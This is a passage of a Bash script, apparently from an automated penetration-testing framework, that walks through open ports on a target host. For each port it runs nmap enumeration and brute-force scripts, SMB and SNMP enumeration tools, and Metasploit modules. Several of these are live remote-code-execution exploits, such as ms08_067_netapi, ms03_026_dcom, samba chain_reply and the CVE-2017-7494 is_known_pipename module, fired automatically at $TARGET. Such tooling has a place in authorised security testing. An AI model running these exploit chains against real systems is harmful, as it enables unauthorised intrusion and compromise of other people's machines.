    showmount -d $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111d.txt
    showmount -e $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111e.txt
  fi
fi

if [ -z "$port_123" ];
then
  echo -e "$OKRED + -- --=[Port 123 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 123 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sU -sV -Pn -T5 --script=ntp-* -p 123 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port123.txt
  fi
fi

if [ -z "$port_135" ];
then
  echo -e "$OKRED + -- --=[Port 135 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 135 opened... running tests...$RESET"
  if [ "$RPC_INFO" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port135.txt
  fi
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -p 135 -T5 --script=rpc* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port135.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw > $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw 2> /dev/null
  fi
fi

if [ -z "$port_137" ];
then
  echo -e "$OKRED + -- --=[Port 137 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 137 opened... running tests...$RESET"
  if [ "$RPC_INFO" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port137.txt
  fi
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -p 137 -T5 --script=broadcast-netbios-master-browser* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port137.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-nbname.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-nbname.raw > $LOOT_DIR/output/msf-$TARGET-nbname.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-nbname.raw 2> /dev/null
  fi
fi

if [ -z "$port_139" ];
then
  echo -e "$OKRED + -- --=[Port 139 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
  SMB="1"
  if [ "$SMB_ENUM" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port139.txt
    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port139.txt
    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port139.txt
  fi
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port139.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port139.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port139.raw > $LOOT_DIR/output/msf-$TARGET-port139.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port139.raw 2> /dev/null
  fi
fi

if [ -z "$port_161" ];
then
  echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port161.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
  fi
fi

if [ -z "$port_162" ];
then
  echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port162.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
  fi
fi

if [ -z "$port_389" ];
then
  echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port389.txt
  fi
fi

if [ -z "$port_443" ];
then
  echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
  if [ "$WAFWOOF" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR WAF $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wafw00f https://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-https.raw 2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-https.raw > $LOOT_DIR/web/waf-$TARGET-https.txt 2> /dev/null
    rm -f $LOOT_DIR/web/waf-$TARGET-https.raw 2> /dev/null
    echo ""
  fi
  if [ "$WHATWEB" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING HTTP INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    whatweb -a 3 https://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-https.raw  2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-https.raw > $LOOT_DIR/web/whatweb-$TARGET-https.txt 2> /dev/null
    rm -f $LOOT_DIR/web/whatweb-$TARGET-https.raw 2> /dev/null
  fi
  if [ "$WIG" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING SERVER INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/wig/wig.py -d -q https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
  curl --connect-timeout 5 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
  curl --connect-timeout 5 -I -s -R -L https://$TARGET | tee $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null
  if [ "$WEBTECH" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    webtech -u https://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-https.txt
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | grep generator | cut -d\" -f4 2> /dev/null | tee $LOOT_DIR/web/webgenerator-https-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING COMMENTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | grep "<\!\-\-" 2> /dev/null | tee $LOOT_DIR/web/webcomments-https-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED DISPLAYING SITE LINKS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | egrep "\"" | cut -d\" -f2 | grep  \/ | sort -u 2> /dev/null | tee $LOOT_DIR/web/weblinks-https-$TARGET.txt 2> /dev/null
  if [ "$SSL" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    sslscan --no-failed $TARGET | tee $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET.raw > $LOOT_DIR/web/sslscan-$TARGET.txt 2> /dev/null
    rm -f $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
    echo ""
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=5000 2> /dev/null
  else
    cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=5000 2> /dev/null
  fi
  echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"

  source $INSTALL_DIR/modes/normal_webporthttps.sh
  source $INSTALL_DIR/modes/osint_stage_2.sh
fi

if [ -z "$port_445" ]; then
  echo -e "$OKRED + -- --=[Port 445 closed... skipping.$RESET"
elif [ $SMB = "1" ]; then
  echo -e "$OKRED + -- --=[Port 445 scanned... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 445 opened... running tests...$RESET"
  if [ "$SMB_ENUM" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING SMB/NETBIOS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port445.txt
    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port445.txt
    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port445.txt
  fi
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port445.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445.raw > $LOOT_DIR/output/msf-$TARGET-port445.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port445.raw 2> /dev/null
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SAMBA ARBITRARY MODULE LOAD CVE-2017-7494 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use linux/samba/is_known_pipename; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw > $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw 2> /dev/null
  fi
fi

if [ -z "$port_512" ];
then
  echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port512.txt
  fi
fi

if [ -z "$port_513" ]
then
  echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port513.txt
  fi
fi

if [ -z "$port_514" ];
then
  echo -e "$OKRED + -- --=[Port 514 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
  if [ "$AMAP" = "1" ]; then
    amap $TARGET 514 -A
  fi
fi

if [ -z "$port_1099" ];
then
  echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
  if [ "$AMAP" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING AMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    amap $TARGET 1099 -A
  fi
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1099.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_server.raw 2> /dev/null
  fi
fi

if [ -z "$port_1433" ];
then
  echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1433.txt
  fi
fi

if [ -z "$port_2049" ];
then
  echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port2049.txt
  fi
  if [ "$RPC_INFO" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    rpcinfo -p $TARGET
  fi
  if [ "$SHOW_MOUNT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHOWMOUNT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    showmount -e $TARGET
  fi
  if [ "$SMB_ENUM" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR NULL SHARES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    smbclient -L $TARGET -U " "%" " 
  fi
fi

if [ -z "$port_3306" ];
then
  echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3306.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw > $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3306-mssql_ping.raw 2> /dev/null
  fi
fi

if [ -z "$port_3310" ];
then
  echo -e "$OKRED + -- --=[Port 3310 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3310 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3310.txt
  fi
fi

if [ -z "$port_3128" ];
then
  echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3128.txt
  fi
fi

if [ -z "$port_3389" ];
then
  echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
  if [ "$NMAP_SCRIPTS" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port3389.txt
  fi
  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw > $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port3389-ms12_020_check.raw 2> /dev/null
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING RDESKTOP CONNECTION $RESET"
